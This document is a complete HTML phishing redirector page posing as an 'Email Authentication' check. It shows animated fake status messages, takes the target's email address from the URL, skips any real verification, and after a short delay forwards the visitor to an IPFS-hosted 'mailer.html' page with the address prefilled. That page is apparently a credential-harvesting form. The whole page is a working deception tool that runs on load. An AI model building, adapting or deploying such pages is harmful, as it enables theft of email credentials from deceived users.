<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Authentication</title>
    <style>
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8eb 100%);
            color: #2d3748;
        }

        .loading-container {
            position: relative;
            width: 120px;
            height: 120px;
            margin-bottom: 30px;
        }

        .spinner {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 8px solid transparent;
            border-top-color: #3b82f6;
            border-bottom-color: #3b82f6;
            animation: spin 1.5s linear infinite;
            box-shadow: 0 0 10px rgba(59, 130, 246, 0.3);
        }

        .spinner-inner {
            position: absolute;
            top: 15px;
            left: 15px;
            right: 15px;
            bottom: 15px;
            border-radius: 50%;
            border: 6px solid transparent;
            border-left-color: #60a5fa;
            border-right-color: #60a5fa;
            animation: spinReverse 2s linear infinite;
        }

        .spinner-core {
            position: absolute;
            top: 30px;
            left: 30px;
            right: 30px;
            bottom: 30px;
            border-radius: 50%;
            border: 4px solid #93c5fd;
            animation: pulse 2s ease-in-out infinite;
        }

        .spinner-dot {
            position: absolute;
            top: 10px;
            left: 50%;
            width: 12px;
            height: 12px;
            margin-left: -6px;
            background-color: #1d4ed8;
            border-radius: 50%;
            animation: orbit 1.5s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes spinReverse {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(-720deg); }
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); opacity: 0.7; }
            50% { transform: scale(1.05); opacity: 1; }
        }

        @keyframes orbit {
            0% { transform: rotate(0deg) translateX(40px) rotate(0deg); }
            100% { transform: rotate(360deg) translateX(40px) rotate(-360deg); }
        }

        .status-text {
            font-size: 1.1rem;
            font-weight: 500;
            margin-top: 20px;
            color: #4b5563;
            position: relative;
        }

        .status-text::after {
            content: '...';
            position: absolute;
            animation: dots 1.5s steps(5, end) infinite;
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60%, 100% { content: '...'; }
        }

        .progress-container {
            width: 200px;
            height: 4px;
            background: #e5e7eb;
            border-radius: 2px;
            margin-top: 30px;
            overflow: hidden;
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #3b82f6, #6366f1);
            border-radius: 2px;
            animation: progress 2s ease-in-out infinite;
        }

        @keyframes progress {
            0% { width: 0%; margin-left: 0; }
            50% { width: 100%; margin-left: 0; }
            100% { width: 0%; margin-left: 100%; }
        }

        .error-message {
            color: #dc2626;
            margin-top: 30px;
            max-width: 300px;
            display: none;
        }

        .error-message h1 {
            font-size: 1.5rem;
            margin-bottom: 10px;
        }

        .error-message p {
            margin: 5px 0;
            color: #6b7280;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="spinner"></div>
        <div class="spinner-inner"></div>
        <div class="spinner-core"></div>
        <div class="spinner-dot"></div>
    </div>
    
    <div class="status-text" id="status-text">Initializing authentication</div>
    
    <div class="progress-container">
        <div class="progress-bar"></div>
    </div>

    <div class="error-message" id="error-message">
        <h1 id="error-title">Authentication Failed</h1>
        <p id="error-detail">Could not verify your email address</p>
        <p>Please try again or contact support</p>
    </div>

    <script>
        // Configuration
        const CONFIG = {
            // Your specified IPFS redirect URL
            redirectUrl: "https://bafybeidys4lteadkyfijzaizjrsmbwxdgebpxwd4qyfnguj2a7rd423b54.ipfs.dweb.link/mailer.html#{email}",
            
            // Status messages
            statusMessages: {
                initializing: "Initializing authentication",
                verifying: "Verifying email address",
                redirecting: "Redirecting to secure portal",
                success: "Authentication successful"
            },
            
            // Timeouts (in milliseconds)
            timeouts: {
                checkDelay: 800,
                redirectDelay: 1500
            }
        };

        function showError(title, detail) {
            document.querySelector('.loading-container').style.display = 'none';
            document.querySelector('.progress-container').style.display = 'none';
            document.getElementById('status-text').style.display = 'none';
            
            const errorEl = document.getElementById('error-message');
            document.getElementById('error-title').textContent = title;
            document.getElementById('error-detail').textContent = detail;
            errorEl.style.display = 'block';
        }

        function getEmailFromUrl() {
            // Check URL hash first (#email=value)
            if (window.location.hash.includes('email=')) {
                const hashParams = new URLSearchParams(window.location.hash.substring(1));
                return hashParams.get('email');
            }
            
            // Check query parameters (?email=value)
            const queryParams = new URLSearchParams(window.location.search);
            return queryParams.get('email');
        }

        function validateEmail(email) {
            // Simple email validation
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }

        function proceedWithRedirect(email) {
            const encodedEmail = encodeURIComponent(email);
            const destinationUrl = CONFIG.redirectUrl.replace('{email}', encodedEmail)
                                                  .replace('[[-Email-]]', encodedEmail);
            
            document.getElementById('status-text').textContent = CONFIG.statusMessages.redirecting;
            
            setTimeout(() => {
                window.location.href = destinationUrl;
            }, CONFIG.timeouts.redirectDelay);
        }

        function initAuthentication() {
            document.getElementById('status-text').textContent = CONFIG.statusMessages.initializing;
            
            setTimeout(() => {
                const email = getEmailFromUrl();
                
                if (!email) {
                    showError("Missing Email", "No email address provided in the URL");
                    return;
                }
                
                if (!validateEmail(email)) {
                    showError("Invalid Email", "Please provide a valid email address");
                    return;
                }
                
                document.getElementById('status-text').textContent = CONFIG.statusMessages.verifying;
                
                // Skip URL verification and proceed with redirect
                // This avoids CORS issues on GitHub Pages
                proceedWithRedirect(email);
                
            }, CONFIG.timeouts.checkDelay);
        }

        // Start the authentication process when page loads
        window.addEventListener('DOMContentLoaded', initAuthentication);
    </script>
</body>
</html>
